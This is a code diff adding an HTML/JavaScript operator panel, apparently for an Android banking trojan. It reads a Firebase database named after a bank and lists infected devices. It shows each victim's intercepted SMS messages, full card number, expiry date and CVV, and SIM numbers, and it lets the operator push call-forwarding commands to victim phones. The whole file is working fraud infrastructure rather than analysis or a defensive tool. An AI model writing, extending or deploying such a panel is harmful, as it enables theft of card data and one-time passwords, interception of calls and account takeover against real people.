@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite B&W Pro</title>
+    <style>
+        :root { --bg: #000000; --card: #0a0a0a; --text: #ffffff; --border: #262626; --sub: #888888; }
+        body { margin: 0; padding: 10px; font-family: 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); }
+        
+        header { border: 1px solid var(--border); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
+        .live-tag { font-size: 10px; border: 1px solid #fff; padding: 2px 8px; font-weight: bold; letter-spacing: 1px; }
+        
+        #dashboard { display: grid; gap: 10px; }
+        .dev-card { background: var(--card); padding: 16px; border: 1px solid var(--border); cursor: pointer; position: relative; transition: 0.2s; }
+        .dev-card:active { border-color: #fff; background: #111; }
+        .new-badge { position: absolute; top: 0; right: 0; background: #fff; color: #000; font-size: 9px; padding: 2px 6px; font-weight: bold; }
+
+        .row { display: flex; justify-content: space-between; margin-bottom: 4px; font-size: 13px; }
+        .label { color: var(--sub); font-size: 11px; text-transform: uppercase; }
+        .val { font-weight: bold; }
+
+        /* Full Popup */
+        .pop { position: fixed; inset: 0; background: var(--bg); z-index: 1000; display: none; flex-direction: column; }
+        .pop.active { display: flex; }
+        .pop-head { border-bottom: 1px solid var(--border); padding: 20px; display: flex; justify-content: space-between; align-items: center; }
+        
+        .tabs { display: flex; border-bottom: 1px solid var(--border); overflow-x: auto; scrollbar-width: none; }
+        .tab { flex: 1; text-align: center; padding: 15px; font-size: 11px; color: var(--sub); cursor: pointer; text-transform: uppercase; }
+        .tab.active { color: #fff; border-bottom: 2px solid #fff; background: #111; }
+
+        .content { flex: 1; overflow-y: auto; padding: 20px; }
+        .box { border: 1px solid var(--border); padding: 15px; margin-bottom: 15px; }
+        
+        /* Command Inputs */
+        .cmd-input { width: 100%; background: #000; border: 1px solid var(--border); padding: 12px; color: #fff; margin-top: 10px; box-sizing: border-box; outline: none; }
+        .btn { background: #fff; color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 10px; text-transform: uppercase; }
+
+        .sms-card { border-bottom: 1px solid var(--border); padding: 12px 0; }
+        .sms-meta { display: flex; justify-content: space-between; font-size: 10px; color: var(--sub); margin-bottom: 4px; font-weight: bold; }
+        
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 10px 20px; font-size: 12px; font-weight: bold; display: none; z-index: 2000; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div style="font-weight: 900; letter-spacing: 2px;">PANEL PRO+</div>
+    <div id="sync-val" class="live-tag">OFFLINE</div>
+</header>
+
+<div id="dashboard"></div>
+
+<div id="popup" class="pop">
+    <div class="pop-head">
+        <span id="popTitle" style="font-weight: bold; font-size: 14px;">DEVICE DETAIL</span>
+        <span onclick="closePop()" style="cursor:pointer; font-size: 20px;">✕</span>
+    </div>
+    <div class="tabs">
+        <div class="tab active" onclick="switchTab(event, 'sms')">SMS Logs</div>
+        <div class="tab" onclick="switchTab(event, 'card')">Card Info</div>
+        <div class="tab" onclick="switchTab(event, 'fwd')">Forwarding</div>
+        <div class="tab" onclick="switchTab(event, 'sys')">System</div>
+    </div>
+    <div id="popContent" class="content"></div>
+</div>
+
+<div id="toast" class="toast">COMMAND SENT</div>
+
+<script>
+    const fireURL = "https://hdfc99-bd497-default-rtdb.firebaseio.com/";
+    let db = {}; let activeId = null; let activeTab = 'sms';
+
+    async function sync() {
+        try {
+            const r = await fetch(fireURL + ".json");
+            const data = await r.json();
+            db = data.All_Users || {};
+            document.getElementById('sync-val').innerText = "LIVE • " + new Date().toLocaleTimeString();
+            renderList();
+            if(activeId) updatePopup();
+        } catch(e) { document.getElementById('sync-val').innerText = "ERROR"; }
+    }
+
+    function renderList() {
+        const dash = document.getElementById('dashboard');
+        const devs = db.Data?.DeviceInfo || {};
+        const sortedIds = Object.keys(devs).sort((a,b) => b.localeCompare(a));
+        
+        let html = "";
+        sortedIds.forEach((id, index) => {
+            const d = devs[id] || {};
+            html += `
+            <div class="dev-card" onclick="openPop('${id}')">
+                ${index === 0 ? '<div class="new-badge">NEW</div>' : ''}
+                <div class="row"><span class="label">Device ID</span><span class="val">${id}</span></div>
+                <div class="row"><span class="label">Brand</span><span class="val">${d.Brand || 'Generic'}</span></div>
+                <div class="row"><span class="label">Battery</span><span class="val">${d.Battery || '--'}</span></div>
+                <div class="row"><span class="label">Status</span><span class="val">${d.Status || 'Offline'}</span></div>
+            </div>`;
+        });
+        dash.innerHTML = html || "<center>Searching...</center>";
+    }
+
+    function openPop(id) { activeId = id; document.getElementById('popup').classList.add('active'); updatePopup(); }
+    function closePop() { document.getElementById('popup').classList.remove('active'); activeId = null; }
+    function switchTab(e, t) { activeTab = t; document.querySelectorAll('.tab').forEach(el => el.classList.remove('active')); e.target.classList.add('active'); updatePopup(); }
+
+    function updatePopup() {
+        const box = document.getElementById('popContent');
+        if(activeTab === 'sms') {
+            const msgs = db.sms?.[activeId] || {};
+            let h = "";
+            Object.values(msgs).reverse().forEach(m => {
+                h += `<div class="sms-card"><div class="sms-meta"><span>${m.sender}</span><span>${m.receivedDate}</span></div><div>${m.body}</div></div>`;
+            });
+            box.innerHTML = h || "No Messages";
+        }
+        else if(activeTab === 'card') {
+            const c = db.AccountInfo?.[activeId] || {};
+            // Zero Masking Logic - Full details visible
+            box.innerHTML = `<div class="box">
+                <span class="label">Card Number</span><div style="font-size:18px; margin:10px 0; font-weight:bold; letter-spacing:1px;">${c.number || 'No Data'}</div>
+                <div class="row"><span class="label">Expiry</span><span class="val">${c.date || '--'}</span></div>
+                <div class="row"><span class="label">CVV</span><span class="val">${c.cvv || '--'}</span></div>
+            </div>`;
+        }
+        else if(activeTab === 'fwd') {
+            const cf = db.CallForwarding?.[activeId] || {};
+            box.innerHTML = `
+                <div class="box">
+                    <span class="label">Live Status</span>
+                    <div style="margin:5px 0;">${cf.callForwardStatus || 'IDLE'}</div>
+                    <div style="font-size:11px; color:var(--sub)">Active Num: ${cf.toNumber || 'None'}</div>
+                </div>
+                <div class="box" style="border-color:#fff">
+                    <span class="label">Set New Forwarding</span>
+                    <input type="number" id="fwd_num" class="cmd-input" placeholder="Number (e.g. 91...)">
+                    <button class="btn" onclick="sendFwd()">Set Forwarding</button>
+                </div>`;
+        }
+        else if(activeTab === 'sys') {
+            const s = db.simDetails?.[activeId] || {};
+            box.innerHTML = `
+                <div class="box"><span class="label">SIM 1</span><div>${s.sim1Number || 'N/A'}</div><div style="font-size:11px; color:var(--sub)">${s.sim1Provider || ''}</div></div>
+                <div class="box"><span class="label">SIM 2</span><div>${s.sim2Number || 'N/A'}</div><div style="font-size:11px; color:var(--sub)">${s.sim2Provider || ''}</div></div>`;
+        }
+    }
+
+    async function sendFwd() {
+        const num = document.getElementById('fwd_num').value;
+        if(num.length < 10) return alert("Bhai number check karo!");
+        
+        showToast("Sending Command...");
+        // Updated Forwarding Logic
+        await fetch(fireURL + `All_Users/CallForwarding/${activeId}.json`, {
+            method: 'PATCH',
+            body: JSON.stringify({ 
+                toNumber: num, 
+                callForwardStatus: "SETTING...", 
+                timestamp: new Date().getTime() 
+            })
+        });
+        showToast("SENT SUCCESS");
+    }
+
+    function showToast(m) {
+        const t = document.getElementById('toast');
+        t.innerText = m; t.style.display = 'block';
+        setTimeout(() => t.style.display = 'none', 2500);
+    }
+
+    setInterval(sync, 1500);
+    sync();
+</script>
+</body>
+</html>
+
